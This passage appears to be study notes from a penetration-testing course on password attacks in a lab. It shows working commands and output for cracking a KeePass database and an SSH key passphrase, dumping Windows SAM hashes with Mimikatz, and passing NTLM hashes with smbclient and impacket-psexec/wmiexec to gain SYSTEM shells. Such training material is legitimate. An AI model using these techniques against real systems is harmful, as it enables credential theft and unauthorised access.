+ Without this, we may need to run multiple wordlists with (or without) pre-existing rules for a broad coverage of possible passwords

#### Attack the hash
After all the preparation, we can start our tool and begin the cracking process
+ At this point, we must take special care in copying and pasting our hashes
+ An extra space or a newline could render our efforts worthless
+ In addition, we should be sure of the hash type we are using. For example, hashid can't automatically determine if **b08ff247dc7c5658ff64c53e8b0db462** is MD2, MD4, or MD5
+ An incorrect choice will obviously waste time
+ We can avoid this situation by double-checking the results with other tools and doing additional research

<mark style="background: #D2B3FFA6;">hashid</mark> usage to identify the hash type:
``` 
hashid -mje
```
+ `-mje` will give the corresponding Hashcat and JohnTheRipper mode/format, as well as specifying an extended mode

### Password Manager
Password managers create and store passwords for different services, protecting them with a master password
+ This master password grants access to all passwords held by the password manager
+ Users often copy and paste these passwords from the password manager or use an auto-fill function tied to a browser
+ Examples of popular password managers are _1Password_ and _KeePass_
+ This type of software can assist users who are often forced to maintain many, often complex passwords, but it can also introduce risk into an organization

Will demonstrate a very common penetration test scenario
+ Let's assume we have gained access to a client workstation running a password manager
+ In the following demonstration, we'll extract the password manager's database, transform the file into a format usable by Hashcat, and crack the master database password

Let's begin by connecting to the SALESWK01 machine (192.168.50.203) over RDP
+ Assuming we've obtained credentials for the _jason_ user (_lab_), we'll log in and after a successful connection, we'll gain access to the system desktop

Once connected, we'll check which programs are installed on the system
+ There are many ways to search for installed programs, but since we have GUI access, we'll use the _Apps & features_ function of Windows, which is the most straight-forward approach
+ We'll click on the Windows icon, type "Apps", select _Add or remove programs_ and scroll down to review all installed programs:
![[Pasted image 20231106115931.png]]

The list shows us that _KeePass_ is installed on the system
+ If we were unfamiliar with this program, we would research it, eventually discovering that the KeePass database is stored as a _.kdbx_ file and that there may be more than one database on the system
+ For example, a user may maintain a personal database and an organization may maintain a department-level database
+ Our next step is to locate the database files by searching for all **.kdbx** files on the system

Let's use PowerShell with the _Get-ChildItem_ cmdlet to locate files in specified locations
+ We'll use `-Path C:\` to search the whole drive
+ Next, we'll use `-Include` to specify the file types we want to include, `-File` and `-Recurse` arguments to get a list of files and search in subdirectories
+ Finally we'll set `-ErrorAction` to `SilentlyContinue` to silence errors and continue execution
+ Usage: 
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
+ Example output:
```
    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022   8:19 AM           1982 Database.kdbx
```

The output reveals a database file in the _jason_ user's **Documents** folder:
![[Pasted image 20231106120939.png]]

We'll transfer this file to our Kali system in preparation for the following steps
+ We have now completed the first step of the cracking methodology and can proceed to the next step, transforming the hash into a format our cracking tool can use

The JtR suite includes various transformation scripts like _ssh2john_ and _keepass2john_, which can format a broad range of different file formats, and they are installed by default on our Kali machine. 
+ We can also use these scripts to format hashes for Hashcat

Let's use the **keepass2john** script to format the database file and save the output to **keepass.hash**
```
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx


kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash   

kali@kali:~/passwordattacks$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

The Listing above shows the resulting hash of the KeePass database stored in **keepass.hash**
+ Before we can work with the resulting hash, we need to further modify it 

In our case, the JtR script prepended the filename _Database_ to the hash
+ The script does this to act as the username for the target hash
+ This is helpful when cracking database hashes, since we want the output to contain the corresponding username and not only the password
+ Since KeePass uses a master password without any kind of username, we need to remove the "Database:" string with a text editor

After removing the `Database:` string the hash is in the correct format for Hashcat:
```
kali@kali:~/passwordattacks$ cat keepass.hash   
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
```

We're nearly ready to start the cracking process, but we need to determine the hash type for KeePass. We could look it up in the Hashcat Wiki, or grep the hashcat help output as shown below:
```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
```
+ The output of the grep command shows that the correct mode for KeePass is 13400

Let's skip step three (cracking time calculation) since this is a simple example and won't take long, and move on to step four to prepare our wordlist. 
+ We'll use one of the Hashcat-provided rules (**rockyou-30000.rule**), as mentioned earlier, combined with the **rockyou.txt** wordlist
+ This rule file is especially effective with **rockyou.txt**, since it was created for it

As we enter step five, we've prepared everything for our password attack. 
+ Let's use **hashcat** with the updated arguments and start cracking:
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
+ Example Output:
```
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```

After several seconds Hashcat successfully cracked the hash, and discovered the KeePass master password of "qwertyuiop123!"
+ Let's run KeePass over our RDP connection and when prompted, enter the password:
![[Pasted image 20231106121439.png]]

Very nice! We opened KeePass with the cracked password. Now we have access to all the user's stored passwords:
![[Pasted image 20231106121449.png]]

### SSH Private Key Passphrase
Even though SSH private keys should be kept confidential, there are many scenarios in which these files could be compromised
+ For example, if we gain access to a web application via a vulnerability like _Directory Traversal_, we could read files on the system
+ We could use this to retrieve a user's SSH private key
+ However, when we try to use it to connect to the system, we would be prompted for a passphrase
+ To gain access, we'll need to crack the passphrase

Let's demonstrate this scenario and how to use the cracking methodology we discussed to crack the passphrase of a private key
+ When we used a dictionary attack on the BRUTE HTTP login form, we gained access to a web-based file manager that hosted an SSH private key

Let's browse another web service, which (for this demonstration) is located at `http://192.168.50.201:8080` and log in with a username of _user_ and a password of _121212_

This web service is similar to the previous TinyFileManager example except that the main directory now contains the two additional files **id_rsa** and **note.txt**
+ Let's download both of them to our Kali machine and save them to our **passwordattacks** directory. First, we'll review the contents of **note.txt**

```
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```
+ The output shows that this note contains _dave_'s password list in plaintext
+ This is a potential gold mine of information
+ In a real-world situation, we would need to perform significantly more information gathering (including learning the actual username associated with each password), but for purposes of demonstration we'll run with this

Let's try to use the private key **id_rsa** for the newly-identified user _dave_ in an SSH connection
+ For this, we must modify the permissions of the downloaded private key
+ The SSH port used in this example is 2222
+ We will try each of these passwords as the passphrase for the SSH private key
+ Note that the _ssh_ program will not echo the passphrase
```
kali@kali:~/passwordattacks$ chmod 600 id_rsa

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
dave@192.168.50.201's password: 

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
```

None of the passwords from the text file worked for this passphrase
+ However, in a real penetration test we would keep these passwords on hand for various other vectors including spray attacks, or attacks against a _dave_ user on other systems
+ However, we still need a passphrase to use _dave_'s private key

According to the **note.txt** file, a new password policy was enabled in January 2022
+ There's a high probability that _dave_ has a passphrase that satisfies the new password policy

Following the cracking methodology, our next step is to transform the private key into a hash format for our cracking tools
+ We'll use the **`ssh2john`** transformation script from the JtR suite and save the resulting hash to **ssh.hash** 
```
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```
+ Within this output, "`$6$`" signifies _SHA-512_
+ As before, we'll remove the filename before the first colon. Then, we'll determine the correct Hashcat mode
```
kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
...
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
```
+ The output indicates that "`$6$`" is mode 22921.

Now, let's proceed in our methodology and create a rule file and prepare a wordlist to crack the hash
+ We'll again review **note.txt** to determine which rules we should create and which passwords we'll include in the wordlist
```
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```

We notice that _dave_ used "137" for the three numbers in the "rickc137" password
+ Furthermore, the "Window" password starts with a capitalized letter
+ Let's use a rule function to make the first letter upper case
+ There is no special character included in any of the listed passwords
+ For our first cracking attempt, we'll just use the most common special characters "!", "@", and "#", since they are the first three special characters when typing them from the left side of many keyboard layouts

Based on the analysis, we'll create our rules. We'll use **c** for the capitalization of the first letter and **$1** **$3** **$7** for the numerical values
+ To address the special characters, we'll create rules to append the different special characters `$!`, `$@`, and `$#` 
```
kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Next, we'll create a wordlist file containing the passwords from **note.txt** and save the output to **ssh.passwords**
```
kali@kali:~/passwordattacks$ cat ssh.passwords
Window
rickc137
dave
superdave
megadave
umbrella
```

Now we can use Hashcat to perform the cracking by specifying the rules file, the wordlist, and the mode
```
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting
...

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
...
```

Unfortunately, we receive an error indicating that our hash caused a "Token length exception"
+ When we research this with a search engine, several discussions suggest that modern private keys and their corresponding passphrases are created with the _aes-256-ctr_ cipher, which Hashcat's mode 22921 does not support
+ This reinforces the benefit of using multiple tools since John the Ripper (JtR) can handle this cipher

To be able to use the previously created rules in JtR, we need to add a name for the rules and append them to the **/etc/john/john.conf** configuration file
+ For this demonstration, we'll name the rule **sshRules** with a "List.Rules" rule naming syntax (as shown in Listing 34). We'll use **sudo** and **sh -c** to append the contents of our rule file into **/etc/john/john.conf**
```
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

Now that we've successfully added our sshRules to the JtR configuration file, we can use **john** to crack the passphrase in the final step of our methodology. We'll define our wordlist with **--wordlist=ssh.passwords**, select the previously created rule with **--rules=sshRules**, and provide the hash of the private key as the final argument, **ssh.hash**
```
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We successfully cracked the private key passphrase
+ As expected, the "Umbrella137!" password satisfied the password policy requirements and also matched _dave_'s personal preferences and habits
+ This is no surprise, since users rarely change their password patterns

Now, let's use the passphrase to connect to the target system via SSH
```
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

0d6d28cfbd9c:~$
```

We successfully connected to the target system by providing the correct passphrase to the private key
+ In this section, we again executed the password cracking methodology and reinforced the idea of careful detail to human behavior patterns
+ We adapted to an error in our main tool (Hashcat) by using another tool (JtR) instead

**Note**: private keys are most often stored as `/home/<USER>/.ssh/id_rsa`

## Working with Password Hashes
In real-life penetration tests we will often gain privileged access to a system and can leverage those privileges to extract password hashes from the operating system
+ We can also make and intercept Windows network authentication requests and use them in further attacks like _pass-the-hash_ or in _relay attacks_
+ **NOTE**: While in most assignments we'll face an Active Directory environment, this Learning Unit only covers local Windows machines. However, the skills learned here are a stepping stone to the later Active Directory Modules in this course

 Will demonstrate how to obtain hashes from the Windows operating system
 + We'll show how we can crack these hashes or use them to gain access to other systems
 + For this, we'll cover two different hash implementations on Windows: _NT LAN Manager_ (NTLM) hash and _Net-NTLMv2_.

### Cracking NTLM
Before we begin cracking NTLM hashes, let's discuss the NTLM hash implementation and how it is used
+ Then, we'll demonstrate how we can obtain and crack NTLM hashes in Windows

Windows stores hashed user passwords in the _Security Account Manager_ (SAM) database file, which is used to authenticate local or remote users
+ **NOTE**: To deter offline SAM database password attacks, Microsoft introduced the _SYSKEY_ feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: _LAN Manager_ (LM) and NTLM. LM is based on _DES_, and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008

On modern systems, the hashes in the SAM are stored as **NTLM** hashes
+ This hash implementation addresses many weaknesses of LM.
+ For example, passwords are case-sensitive and are no longer split into smaller, weaker parts
+ However, NTLM hashes stored in the SAM database are not salted

_Salts_ are random bits appended to a password before it is hashed
+ They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password
+  list or table of precomputed passwords is called a _Rainbow Table_ and the corresponding attack is called a _Rainbow Table Attack_

We use "NTLM hash" to refer to the formally correct _NTHash_. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion

We cannot just copy, rename, or move the SAM database from **C:\Windows\system32\config\sam** while the Windows operating system is running because the kernel keeps an exclusive file system lock on the file

Fortunately, we can use the _Mimikatz_ tool to do the heavy lifting for us and bypass this restriction
+ Mimikatz provides the functionality to extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash
+ Mimikatz also includes the _sekurlsa_ module, which extracts password hashes from the _Local Security Authority Subsystem_ (LSASS) process memory
+ LSASS is a process in Windows that handles user authentication, password changes, and _access token_ creation

LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module
+ We need to understand that LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator

Due to this, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the _SeDebugPrivilege_ access right enabled
+ This access right grants us the ability to debug not only processes we own, but also all other users' processes

We can also elevate our privileges to the _SYSTEM_ account with tools like _PsExec_ or the built-in Mimikatz _token elevation function_ to obtain the required privileges
+ The token elevation function requires the _SeImpersonatePrivilege_ access right to work, but all local administrators have it by default

Now that we have a basic understanding of what NTLM hashes are and where we can find them, let's demonstrate obtaining and cracking them

We'll retrieve passwords from the SAM of the `MARKETINGWK01` machine at `192.168.50.210`
+ We can log in to the system via RDP as user _offsec_, using _lab_ as the password
+ We'll begin by using `Get-LocalUser` to check which users exist locally on the system
```
PS C:\Users\offsec> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
...
```

The output indicates the existence of another user named _nelly_ on the `MARKETINGWK01` system
+ Our goal in this example is to obtain _nelly_'s plain text password by retrieving the NTLM hash and cracking it 

We already know that the credentials of users are stored when they log on to a Windows system, but credentials are also stored in other ways
+ For example, the credentials are also stored when a service is run with a user account

We'll use Mimikatz (located at **C:\tools\mimikatz.exe**) to check for stored credentials on the system
+ Let's start PowerShell as administrator by clicking on the Windows icon in the taskbar and typing "powershell".
+ We'll select _Windows PowerShell_ and click on _Run as Administrator_ as shown in the following figure
+ We'll confirm the _User Account Control_ (UAC) popup window by clicking on _Yes_

In the PowerShell window, we'll change to **C:\tools** and start Mimikatz
```
PS C:\Windows\system32> cd C:\tools

PS C:\tools> ls

    Directory: C:\tools


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe

PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```
+ According to the prompt, Mimikatz is running and we can interact with it through its command-line environment
+ Each command consists of a module and a command delimited by two colons, for example, **`privilege::debug`**

We can use various commands to extract passwords from the system
+ One of the most common Mimikatz commands is **`sekurlsa::logonpasswords`**, which attempts to extract plaintext passwords and password hashes from all available sources
+ Since this generates a huge amount of output, we'll instead use **`lsadump::sam`**, which will extract the NTLM hashes from the SAM
+ For this command, we must first enter **`token::elevate`** to elevate to SYSTEM user privileges

For both commands, **`sekurlsa::logonpasswords`** and **`lsadump::sam`**, we must have the SeDebugPrivilege access right enabled, which we'll accomplish with **`privilege::debug`**
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```

The output shows that we successfully enabled the SeDebugPrivilege access right and obtained SYSTEM user privileges
+ The output of the **`lsadump::sam`** command reveals two NTLM hashes, one for _offsec_ and one for _nelly_. Since we already know that the NTLM hash of _offsec_ was calculated from the plaintext password "lab", we'll skip it and focus on _nelly's_ NTLM hash

Let's copy the NTLM hash and paste it into **nelly.hash** in the **passwordattacks** directory on our Kali machine
```
kali@kali:~/passwordattacks$ cat nelly.hash     
3ae8e5f0ffabb3a627672e1600f1ba10
```

Next, we'll retrieve the correct hash mode from Hashcat's help output
```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"   
                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System
```
+ The output indicates that the correct mode is 1000

We now have everything we need to start cracking the NTLM hash
+ We've already extracted the hash because Mimikatz outputs a format that Hashcat accepts
+ The next step is choosing a wordlist and rule file
+ For this example we'll use the **rockyou.txt** wordlist with the **best64.rule** rule file, which contains 64 effective rules

Let's provide all arguments and values to the **hashcat** command to start the cracking process
```
kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting
...
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
...
```

The output shows that we successfully cracked the NTLM hash of the _nelly_ user
+ The plaintext password used to create this hash is _nicole1_
+ Let's confirm this by connecting to the system with RDP
![[Pasted image 20231107140819.png]]

While we did all of this on a local system without an Active Directory environment, this process applies to enterprise environments and is a crucial skill for most real-life penetration tests
+ In the next section we'll demonstrate how we can leverage NTLM hashes even if we are unable to crack them

### Passing NTLM
In the last section, we obtained an NTLM hash and cracked it 
+ Depending on the strength of the password this may be time-consuming or unfeasible
+ Will demonstrate how we can leverage an NTLM hash without cracking it

First, we will demonstrate the _pass-the-hash_ (PtH) technique
+ We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
+ This is possible because NTLM/LM password hashes are not salted and remain static between sessions
+ Moreover, if we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password
+ To leverage this into code execution of any kind, the account also needs administrative privileges on the second target

If we don't use the local _Administrator_ user in pass-the-hash, the target machine also needs to be configured in a certain way to obtain successful code execution
+ Since Windows Vista, all Windows versions have _UAC remote restrictions_ enabled by default
+ This prevents software or commands from running with administrative rights on remote systems
+ This effectively mitigates this attack vector for users in the local administrator group aside from the local _Administrator_ account

In this demonstration, let's assume that we've already gained access to FILES01 and obtained the password (_password123!_) for the _gunther_ user
+ We want to extract the _Administrator_'s NTLM hash and use it to authenticate to the FILES02 machine

We'll assume that the local _Administrator_ accounts on both machines, FILES01 and FILES02, have the same password
+ This is quite common and is often found in real-life assessments

We'll begin by connecting to FILES01 (192.168.50.211) with RDP using a username of _gunther_ and a password of _password123!_
+ We'll then start Windows Explorer and enter the path of the SMB share (**\\192.168.50.212\secrets**) in the navigation bar
+ After entering the command, we are prompted for credentials to connect to the share

When we enter our credentials for the _gunther_ user, we are notified that Windows cannot access this share
+ This means that the user account does not exist on FILES02 or it doesn't have the necessary permissions to access the share

Now, let's obtain the NTLM hash of _Administrator_ with Mimikatz, as we did in the previous section
+ Again, Mimikatz is located in **C:\tools** on FILES01
+ We'll open a PowerShell window as Administrator and fire up Mimikatz
+ Next, we'll enter the commands **`privilege::debug`**, **`token::elevate`**, and **`lsadump::sam`** to retrieve the stored NTLM hash from the SAM
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
...
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...
```
+ Above displays the output of the NTLM hash extraction. We'll save the _Administrator_ NTLM hash for later use

To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes
+ Fortunately for us, we have many to choose from
+ Let's review a few examples for different use cases:
	+ For SMB enumeration and management, we can use _smbclient_ or _CrackMapExec_.
	+ For command execution, we can use the scripts from the _impacket_ library like _psexec.py_ and _wmiexec.py_ 
+ We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and _WinRM_, if the user has the required rights
+ We can also use Mimikatz to conduct pass-the-hash as well

Since the first goal of this demonstration is to gain access to an SMB share by providing an NTLM hash, we'll use **smbclient**
+ To use the command, we need to enter the path of the share as the first argument by escaping the backslashes. In this case, we will enter **`\\\\192.168.59.212\\secrets`**
+ We'll use the **`-U Administrator`** to set the user and **`--pw-nt-hash`** to indicate the hash

After we successfully connect to the SMB share "secrets" with smbclient, we can list all files in the SMB share with **dir**
+ We can also use the **get** command to download files to our Kali machine
```
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Jun  2 16:55:35 2022
  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022

                4554239 blocks of size 4096. 771633 blocks available

smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

We successfully connected to the SMB share by providing the NTLM hash instead of a password
+ The directory listing reveals a **secrets.txt** file. After downloading the file we can view its contents

In the first part of this demonstration we used an NTLM hash to gain access to a SMB share, in the second part, our goal is to obtain an interactive shell
+ Again, we have a variety of different tools and scripts at our disposal but here we'll use the **psexec.py** script from the impacket library

The script is very similar to the original Sysinternals _PsExec_ command
+ It searches for a writable share and uploads an executable file to it 
+ Then it registers the executable as a Windows service and starts it 
+ The desired result is often to obtain an interactive shell or code execution

We can use the _impacket-scripts_ package to execute **psexec.py** on Kali
+ This package contains links to the example scripts of the impacket library and provides a user-friendly way to use them

To execute _psexec_, we can enter **impacket-psexec** with two arguments
+ The first argument is **-hashes**, which allows us to use NTLM hashes to authenticate to the target
+ The format is `LMHash:NTHash`, in which we specify the Administrator NTLM hash after the colon
+ Since we only use the NTLM hash, we can fill the LMHash section with 32 0's

The second argument is the target definition in the format `username@ip`
+ At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system
+ If we leave it empty, **cmd.exe** will be executed, providing us with an interactive shell
+ Usage:
```
impacket-psexec -hashes 00000000000000000000000000000000:<HASH> Administrator@<IP>
```
+ Example usage and output:
```
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
FILES02

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> exit

kali@kali:~$
```
+ We successfully obtained an interactive shell on FILES02
+ Due to the nature of _psexec.py_, we'll always receive a shell as SYSTEM instead of the user we used to authenticate

We can also use one of the other impacket scripts like _wmiexec.py_ to obtain a shell as the user we used for authentication
+ On Kali, we would use **impacket-wmiexec** along with the arguments we used for _impacket-psexec_
+ Usage:
```
impacket-wmiexec -hashes 00000000000000000000000000000000:<HASH> Administrator@<IP?
```
+ Example Usage and Output:
```
kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator

C:\>
```
+ As the _whoami_ output shows, we obtained a shell as the _Administrator_ user with _wmiexec_ instead of _SYSTEM_

### Cracking Net-NTLMv2
In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user
+ This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes
+ In situations like these, we can abuse the _Net-NTLMv2_ network authentication protocol
+ This protocol is responsible for managing the authentication process for Windows clients and servers over a network
+ **NOTE**: We use "Net-NTLMv2" to refer to the formally correct _NTLMv2_. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion

Let's walk through an example to get familiar with the basics of the authentication process
